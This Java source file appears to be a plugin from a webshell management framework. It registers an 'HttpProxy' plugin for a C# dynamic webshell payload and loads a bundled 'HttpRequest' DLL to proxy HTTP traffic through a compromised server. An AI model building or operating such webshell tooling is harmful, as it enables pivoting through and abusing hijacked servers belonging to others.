package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import core.imp.Plugin;
import java.io.IOException;
import java.io.InputStream;
import shells.plugins.generic.HttpProxy;
import util.functions;

@PluginAnnotation(
   payloadName = "CShapDynamicPayload",
   Name = "HttpProxy",
   DisplayName = "Http代理"
)
public class CHttpProxy extends HttpProxy implements Plugin {
   private static final String CLASS_NAME = "HttpRequest.Run";

   public byte[] readPlugin() throws IOException {
      InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.dll", "HttpRequest"));
      byte[] data = functions.readInputStream(inputStream);
      inputStream.close();
      return data;
   }

   public String getClassName() {
      return "HttpRequest.Run";
   }
}
